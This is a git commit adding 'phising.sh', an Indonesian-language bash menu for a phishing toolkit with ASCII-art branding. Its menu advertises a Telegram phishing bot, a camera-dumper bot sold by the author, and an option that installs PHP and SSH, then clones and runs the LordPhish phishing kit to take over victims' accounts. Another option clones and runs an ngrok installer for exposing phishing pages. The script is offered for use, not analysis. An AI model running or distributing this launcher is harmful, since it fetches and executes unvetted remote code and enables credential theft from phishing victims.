c3fffa041c599b5a4159c00dcda36467cb0fe796
Kingcy78 <hozooapi@gmail.com>
2024-10-07 01:13:24 +0700

    Create phising.sh

---
+++ phising.sh
@@ -0,0 +1,105 @@
+#!/bin/bash
+blue='\033[34;1m'
+green='\033[32;1m'
+purple='\033[35;1m'
+cyan='\033[36;1m'
+red='\033[31;1m'
+white='\033[37;1m'
+yellow='\033[33;1m'
+mvp epep.mp3
+echo -e $purple"
+            ⣀⣠⣤⡶⠶                ⠲⠶⣤⣤⣄⣀       
+          ⢀⣠⣶⣿⣿⠟⠉                     ⠙⠻⡿⣿⣦⣄
+          ⣰⣿⣿⢏⡔⠁                         ⠘⢎⠻⣿⣷⡄  
+         ⣰⣿⣻⠃⡞                            ⠈⡇⢹⣿⣿⡄ 
+         ⢰⣿⣟⡗ ⡇                             ⣿⠐⣛⣿⣿ 
+          ⢸⣿⣿⡓ ⢳⡀        ⣀⣀     ⠠⢄⣀⡀        ⣰⠇⠐⣻⣿⣿⡆
+           ⢸⣿⣿⡷⠖⠋⠻⣄  ⣀⣤⠶⠚⠉⠁         ⠈⠙⠲⢦⣄⡀ ⢀⣴⠏⠈⠲⢿⣿⣿⠇
+            ⠸⣿⣿⣿⣧⠞⠁⠈⠻⢾⣏                  ⠈⣻⡷⠋⡁⠈⢦⣾⣿⣿⣿ 
+              ⠹⣿⣿⣷⣷⡴⠃  ⡿                  ⣧  ⠱⣴⣷⣯⣿⡿⠃ 
+              ⠙⢿⣿⣯⣾⣿⢗⣼⠃                   ⠹⣦⢾⣿⣮⣿⣿⠟⠁  
+                ⣽⣿⣿⡿⠟⠁                     ⠘⠳⣽⣿⣿⡍    
+                ⢀⣿ ⣀                          ⢀⡠⢸⣇    
+                ⢸⡇ ⠘⣄                         ⡜  ⣿    
+                   ⠘⣇ ⢄⣿⡰⡄                     ⡴⢸⣇ ⢀⡟    
+                   ⣿ ⣾⣿⠇⠹⣶⣤⣀⣀ ⠙⢶⣤⡀   ⣠⣴⠖⠉⢀⣀⣠⣴⡾⠁⢿⣿⡆⢸⡇    
+                   ⢸⣿⠏⢠⣾⣿⣿⣿⣿⣿⣦⡀⠹⡿  ⠸⡿⠁⣤⣾⣿⣿⣿⣿⣷⣦ ⢿⡇⡸     
+                    ⢧⢿⡀⢸⣿⣿⣿⣿⣿⣿⣿⡟⠆     ⠞⣿⣿⣿⣿⣿⣿⣿⣿ ⣸⢧⠇     
+                   ⠈⢈⡷⠈⢿⣿7⣿⣿⣿⣿⣿⡇  ⣠⣤⡀  ⣿⣿⣿⣿⣿⣿⣿⠃ ⣏⠈      
+                     ⢀⡆   ⠙⠻⠿⠿⠿⠟⠁ ⢠⣿⣿⣧  ⠙⠿⠿⠿⠿⠛⠁   ⣆      
+                     ⢸⡄          ⢀⣾⣿⢻⣿⣆           ⣸      
+                      ⠘⢷⣄⡀        ⢾⣿⡿⢸⣿⣿⠆        ⣀⣴⡟      
+                      ⠈⠙⠛⢛⣿⣿⣿⡖⠦⡀  ⠉⠁ ⠉⠁  ⢠⠖⣾⣿⣿⣿⠛⠛⠉       
+                          ⠘⡇⣿⢻⣿⣴⣠⢀ ⡄ ⡀⢀⡄⢀⣀⣼⣼⣿⠹⡇⡟          
+                           ⡀⠧⡇⢸⣿⣿⡇⢹⠒⡟⠙⡟⠉⡗⢹⠁⣿⣿⣿ ⡧⠇⡀         
+                           ⢱  ⠘⢿⣹⠛⠼⣦⣿⣄⣧⣀⣷⣾⠴⢻⣸⠟  ⢠⡇         
+                            ⠘⢧⡀  ⠊⠳⠧⣼⣠⣤⣧⣱⣸⡦⠷⠚⠃  ⣠⠟          
+                              ⠈⠲⣤⡀   ⠈  ⠈    ⣠⡴⠋⠁           
+                                ⠙⢿⣦        ⢀⣾⡟⠁             
+                                  ⠈⠻⢷⣄⣠⣴⣶⣤⣄⣰⠿⠋               
+                                        ⠈⠉
+                         BY RATU CY78     
+          "       
+echo -e "\033[34;1m╔════════════════════════════════════════════════════════╗"
+echo -e "\033[34;1m║ \033[32;1m[01].PHISING BOT TELEGRAM                              \033[34;1m║"
+echo -e "\033[34;1m║ \033[32;1m[02].ZXPIHIZHER MENU MENGAMBIL AKUN DENGAN WEB PIHISING\033[34;1m║"
+echo -e "\033[34;1m║ \033[32;1m[03].CAMDUMPER BOT TELEGRAM FITUR 3                    \033[34;1m║"
+echo -e "\033[34;1m║ \033[32;1m[04].NGROK INSTALL                                     \033[34;1m║"
+echo -e "\033[34;1m║ \033[32;1m[05].VPN MENU MENGAMANKAN WEB AKIBAT TERKENA PHISING   \033[34;1m║"
+echo -e "\033[34;1m║ \033[32;1m[06].LAPOR BUG                                         \033[34;1m║"
+echo -e "\033[34;1m║ \033[32;1m[07]. SUPPORD SUHU                                     \033[34;1m║"
+echo -e "\033[34;1m╚════════════════════════════════════════════════════════╝"
+echo -e  "\033[34;1m║"
+echo -e  "\033[34;1m║"
+echo -e  "\033[34;1m║"
+read -p "╚════ROOT®KALI════> " p
+if [ $p == 1 ]
+then
+sleep 1
+echo -e " \033[32;1m ANDA BUY KE ADMIN CY78 HARGA 20"
+sleep 2
+xdg-open 
+fi
+if [ $p == 2 ]
+then
+apt-get update -y
+apt-get install php -y
+apt-get install openssh -y 
+apt-get install wget -y
+apt-get install git -y
+git clone https://github.com/Black-Hell-Team/LordPhish.git
+cd LordPhish
+bash setup.sh 
+bash lord.sh
+fi
+if [ $p == 3 ]
+then
+sleep 1
+echo -e " \033[32;1m ANDA BUY KE ADMIN CY78 HARGA 20"
+sleep 2
+xdg-open
+fi
+if [ $p == 4 ]
+then
+pkg update -y
+pkg install git
+git clone https://github.com/Yisus7u7/termux-ngrok
+cd termux-ngrok
+bash install.sh
+fi
+if [ $p == 5 ]
+then
+git clone https://github.com/xlinuxmanx/auto-vpn.git
+cd auto-vpn
+chmod +x {setup.sh,win-client.sh}
+chmod +x setup
+./setup
+fi
+if [ $p == 6 ]
+then
+xdg-open https://www.tiktok.com/@kinghozooff?_t=8qK9lpHE7lN&_r=1
+fi
+if [ $p == 7 ]
+then
+xdg-open https://www.tiktok.com/@kinghozooff?_t=8qK9lpHE7lN&_r=1
+fi
